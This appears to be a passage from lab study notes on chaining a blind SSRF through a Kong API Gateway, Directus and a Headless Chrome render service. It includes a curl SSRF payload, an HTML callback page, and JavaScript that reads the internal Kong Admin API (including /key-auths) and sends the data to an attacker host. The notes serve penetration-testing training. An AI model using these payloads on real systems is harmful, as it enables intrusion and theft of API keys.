## Understanding Headless Chrome

Initially, this might seem like another SSRF vulnerability but Headless Chrome is essentially a full browser without a UI.
The headless browser should still execute any JavaScript functions as it loads a web page.

If it does, we have the ability to run arbitrary JavaScript from the browser that is running on the remote server, which would give us the ability to extract data from other internal pages or services, send POST requests, and interact with the other internal resources in many different ways.

We can test this theory by hosting the following HTML webpage on our apache server:

```html
<html>
<head>
<script>
function runscript() {
    fetch("http://192.168.118.3/itworked");
}
</script>
</head>
<body onload='runscript()'>
<div></div>
</body>
</html>
```

Since the application does not return the page loaded with the SSRF vulnerability, we need another way to determine if the browser executes JavaScript.
Our JavaScript function uses _fetch()_ to make a call back to our Kali host.
The _onload_ event in the body tag calls our function. After placing this file in our webroot, let's use the SSRF vulnerability to call the render service pointed at this file:

![](../../03.%20Screenshots/t9-ss24.png)

Making the following curl request:

```sh
curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/api/render?url=http://<attacker IP>/hello.html"}' http://apigateway:8000/files/import
```

We see the following logs in our apache log file:

```ts
192.168.225.135 - - [12/Dec/2022:14:04:05 -0500] "GET /hello.html HTTP/1.1" 200 485 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"

192.168.225.135 - - [12/Dec/2022:14:04:05 -0500] "GET /itworked HTTP/1.1" 200 266 "http://192.168.119.225/hello.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36
```

The first entry lists the hello.html file that we used in the call to the Render API.
The second entry is from the JavaScript function. We have verified we can execute JavaScript in the Headless Chrome browser.

Thus, the attack chain is as follows:

![](../../03.%20Screenshots/t9-ss25.png)

The attack flow is as follows:
1. We make a curl request with the SSRF payload
2. The Kong API Gateway proxies our request to the Files service endpoint on the Directus host.
3. The Directus application takes the value of the _url_ parameter(the render service in this case) and sends a GET request to that URL.
4. The Render service handles the GET request and reads the _url_ parameter out of the URL and sends a GET request to that URL using Headless Chrome.
5. The browser loads the HTML page from our attacker machine and executes the JavaScript, which makes a second GET request to our attacker machine.
6. Finally, the render service passes the result to the file service, however, since we're not authenticated, the reply shows us that we're forbidden.

## Blind SSRF to Simple SSRF

To turn our blind SSRF into a normal one and exfiltrate data, we will use JavaScript.
We'll attempt to use JavaScript to call the Kong Admin API from inside the network.
This might work because, the containers seem to have network connections that allow internal communication between themselves on ports that are not exposed externally.
This is evidenced by the SSRF being able to access port 8001 on (what we perceive to be) the Kong API Gateway host.

If the environment is running in a docker, the default settings allow for all ports on all containers to inter-communicate with each other.
For a port to be accessed from the outside, it needs to be published explicitly.

We will start by creating a script that will make a request to the Kong Admin API.
If the CORS are permissive enough, we will be able to access the response body, through the JavaScript.
If not, we will have to look at the documentation to see what we can do without reading the response.
The script will be as follows:

```JavaScript
function exfiltrate() {
    fetch("http://172.16.16.4:8001")
    .then((response) => response.text())
    .then((data) => {
        fetch("http://<attacker IP>/callback?" + encodeURIComponent(data));
    }).catch(err => {
        fetch("http://<attacker IP>/error?" + encodeURIComponent(err));
    }); 
}
```

When we check our access logs, we see the following:

![](../../03.%20Screenshots/t9-ss26.png)

URL decoding the data and then using a js beautifier, we get loads of data:

![](../../03.%20Screenshots/t9-ss27.png)

We get the username and password for the API, but this isn't useful as the password is hidden.
Going through the documentation of the Kong API, we see that we can get the user key, with the /key-auths end point. Thus we update our exfiltration script as follows:

```JavaScript
function exfiltrate() {
    fetch("http://172.16.16.4:8001/key-auths")
    .then((response) => response.text())
    .then((data) => {
        fetch("http://<attacker IP>/callback?" + encodeURIComponent(data));
    }).catch(err => {
        fetch("http://<attacker IP>/error?" + encodeURIComponent(err));
    }); 
}
```

And, we get the following reply:

![](../../03.%20Screenshots/t9-ss28.png)

With this, we can now proceed to decode and beautify the data, and extract the key:

![](../../03.%20Screenshots/t9-ss29.png)

We can now use this API key, to login, and explore the authenticated part of the application.
